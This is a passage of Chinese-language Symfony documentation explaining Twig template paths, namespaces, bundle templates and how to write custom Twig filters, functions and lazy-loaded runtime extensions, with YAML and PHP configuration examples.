尽管大多数应用将模板存储在默认的 `templates/` 目录中，但你可能需要将部分或全部模板存储在不同的目录中。使用 `twig.paths` 选项来配置这些额外的目录。每个路径被定义为 `key: value` 对，其中 `key` 是模板目录，`value` 是 Twig 命名空间（稍后解释）：

```yaml
# config/packages/twig.yaml
twig:
    # ...
    paths:
        # 目录相对于项目根目录（但你也可以使用绝对目录）
        'email/default/templates': ~
        'backend/templates': ~
```

```php
// config/packages/twig.php
namespace Symfony\Component\DependencyInjection\Loader\Configurator;

return App::config([
    'twig' => [
        // ...

        // 目录相对于项目根目录（但你也可以使用绝对目录）
        'paths' => [
            'email/default/templates' => null,
            'backend/templates' => null,
        ],
    ],
]);
```

渲染模板时，Symfony 首先在未定义命名空间的 `twig.paths` 目录中查找，然后回退到默认模板目录（通常是 `templates/`）。

使用上述配置，如果你的应用渲染 `layout.html.twig` 模板，Symfony 将首先查找 `email/default/templates/layout.html.twig` 和 `backend/templates/layout.html.twig`。如果这些模板中的任何一个存在，Symfony 将使用它，而不是使用 `templates/layout.html.twig`（这可能才是你想要使用的模板）。

Twig 用**命名空间**来解决这个问题，命名空间将多个模板分组在与其实际位置无关的逻辑名称下。更新之前的配置，为每个模板目录定义一个命名空间：

```yaml
# config/packages/twig.yaml
twig:
    # ...
    paths:
        'email/default/templates': 'email'
        'backend/templates': 'admin'
```

```php
// config/packages/twig.php
namespace Symfony\Component\DependencyInjection\Loader\Configurator;

return App::config([
    'twig' => [
        // ...
        'paths' => [
            'email/default/templates' => 'email',
            'backend/templates' => 'admin',
        ],
    ],
]);
```

现在，如果你渲染 `layout.html.twig` 模板，Symfony 将渲染 `templates/layout.html.twig` 文件。使用特殊的 `@` + 命名空间语法来引用其他命名空间模板（例如 `@email/layout.html.twig` 和 `@admin/layout.html.twig`）。

> **注意：** 一个 Twig 命名空间可以与多个模板目录关联。在这种情况下，添加路径的顺序很重要，因为 Twig 将从第一个定义的路径开始查找模板。

### Bundle 模板

如果你在应用中[安装包/bundle](/setup#symfony-flex)，它们可能包含自己的 Twig 模板（在每个 bundle 的 `templates/` 目录中）。为了避免与你自己的模板混淆，Symfony 在以 bundle 名称命名的自动命名空间下添加 bundle 模板。

例如，名为 `AcmeBlogBundle` 的 bundle 的模板在 `AcmeBlog` 命名空间下可用。如果该 bundle 包含模板 `<your-project>/vendor/acme/blog-bundle/templates/user/profile.html.twig`，你可以将其引用为 `@AcmeBlog/user/profile.html.twig`。

> **提示：** 如果你想更改原始 bundle 模板的某些部分，也可以[覆盖 bundle 模板](/bundles/override)。

## 编写 Twig 扩展

[Twig 扩展](https://twig.symfony.com/doc/3.x/advanced.html#creating-an-extension)允许创建自定义函数、过滤器等，以便在你的 Twig 模板中使用。在编写自己的 Twig 扩展之前，请检查你需要的过滤器/函数是否尚未实现于：

* [默认 Twig 过滤器和函数](https://twig.symfony.com/doc/3.x/#reference)；
* [Symfony 添加的 Twig 过滤器和函数](/reference/twig_reference)；
* 与字符串、HTML、Markdown、国际化等相关的[官方 Twig 扩展](https://github.com/twigphp?q=extra)。

### 创建扩展类

假设你想创建一个名为 `price` 的新过滤器，将数字格式化为货币形式：

```twig
{{ product.price|price }}

{# 传入 3 个可选参数 #}
{{ product.price|price(2, ',', '.') }}
```

创建一个普通的 PHP 类，其中包含实现过滤器逻辑的方法。然后，添加 `#[AsTwigFilter]` 属性来定义 Twig 过滤器的名称和选项：

```php
// src/Twig/AppExtension.php
namespace App\Twig;

use Twig\Attribute\AsTwigFilter;

class AppExtension
{
    #[AsTwigFilter('price')]
    public function formatPrice(float $number, int $decimals = 0, string $decPoint = '.', string $thousandsSep = ','): string
    {
        $price = number_format($number, $decimals, $decPoint, $thousandsSep);
        $price = '$'.$price;

        return $price;
    }
}
```

如果你想创建函数而不是过滤器，请使用 `#[AsTwigFunction]` 属性：

```php
// src/Twig/AppExtension.php
namespace App\Twig;

use Twig\Attribute\AsTwigFunction;

class AppExtension
{
    #[AsTwigFunction('area')]
    public function calculateArea(int $width, int $length): int
    {
        return $width * $length;
    }
}
```

> **提示：** 除了自定义过滤器和函数之外，你还可以注册[全局变量](https://twig.symfony.com/doc/3.x/advanced.html#id1)。

如果你使用的是[默认 services.yaml 配置](/service_container#service-container-services-load-example)，[服务自动配置](/service_container/autowiring#services-autoconfigure)功能将把此类启用为 Twig 扩展。否则，你需要手动定义一个服务并[用标签标记它](/service_container/tags)，使用 `twig.attribute_extension` 标签。

### 将扩展注册为服务

接下来，将你的类注册为服务，并用 `twig.extension` 标记它。如果你使用[默认 services.yaml 配置](/service_container#service-container-services-load-example)，你已经完成了！Symfony 将自动了解你的新服务并添加标签。

你现在可以在任何 Twig 模板中开始使用你的过滤器。可选地，执行此命令来确认你的新过滤器已成功注册：

```terminal
# 显示关于 Twig 的所有信息
$ php bin/console debug:twig

# 只显示关于特定过滤器的信息
$ php bin/console debug:twig --filter=price
```

### 创建惰性加载的 Twig 扩展

当[使用属性扩展 Twig](#templates-twig-filter-attribute) 时，**Twig 扩展已经是惰性加载的**，你不必做任何其他事情。但是，如果你的 Twig 扩展遵循继承 `AbstractExtension` 类的**旧方法**，Twig 会在渲染任何模板之前初始化所有扩展，即使它们没有被使用。

如果扩展没有定义依赖项（即如果你没有向它们注入服务），性能不会受到影响。但是，如果扩展定义了许多复杂的依赖项（例如那些建立数据库连接的），性能损失可能很大。

这就是为什么 Twig 允许将扩展定义与其实现解耦。遵循与之前相同的示例，第一个更改是从扩展中删除 `formatPrice()` 方法，并更新 `getFilters()` 中定义的 PHP 可调用对象：

```php
// src/Twig/AppExtension.php
namespace App\Twig;

use App\Twig\AppRuntime;
use Twig\Extension\AbstractExtension;
use Twig\TwigFilter;

class AppExtension extends AbstractExtension
{
    public function getFilters(): array
    {
        return [
            // 此过滤器的逻辑现在在不同的类中实现
            new TwigFilter('price', [AppRuntime::class, 'formatPrice']),
        ];
    }
}
```

然后，创建新的 `AppRuntime` 类（按照惯例，这些类以 `Runtime` 为后缀，但这不是必需的），并包含之前 `formatPrice()` 方法的逻辑：

```php
// src/Twig/AppRuntime.php
namespace App\Twig;

use Twig\Extension\RuntimeExtensionInterface;

class AppRuntime implements RuntimeExtensionInterface
{
    public function __construct()
    {
        // 这个简单的示例没有定义任何依赖，但在你自己的
        // 扩展中，你需要使用此构造函数注入服务
    }

    public function formatPrice(float $number, int $decimals = 0, string $decPoint = '.', string $thousandsSep = ','): string
    {
        $price = number_format($number, $decimals, $decPoint, $thousandsSep);
        $price = '$'.$price;

        return $price;
    }
}
```

如果你使用默认的 `services.yaml` 配置，这将已经起作用！否则，为此类[创建一个服务](/service_container#service-container-creating-service)并[用标签标记你的服务](/service_container/tags)为 `twig.runtime`。
